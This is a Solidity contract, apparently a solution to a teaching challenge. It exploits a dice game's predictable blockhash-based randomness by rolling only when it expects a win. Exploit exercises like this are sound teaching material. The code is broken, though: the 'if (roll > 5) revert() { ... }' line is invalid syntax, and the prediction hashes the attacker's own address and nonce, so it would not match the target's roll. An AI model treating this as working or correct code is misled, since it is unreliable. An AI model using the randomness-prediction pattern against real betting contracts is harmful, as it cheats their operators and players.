pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    uint256 nonce = 0;
    
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        require(msg.sender != address(0), "address zero not allowed");
        require(_addr != address(0), "address zero not allowed");
        require(_amount <= address(this).balance, "Requested amount is greater than contract balance");
        require(address(this).balance > 0, "balance is too small");

        payable(_addr).transfer(_amount);
    }
    
    function riggedRoll() external {
        require(address(this).balance >= .002 ether, "not enough ether");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(this), nonce)
        );
        uint256 roll = uint256(hash) % 16;

        if (roll > 5) revert() {
            diceGame.rollTheDice{value: .002 ether}();
            nonce++;
        }
        
    }
    
    receive() external payable {
        
    }

}
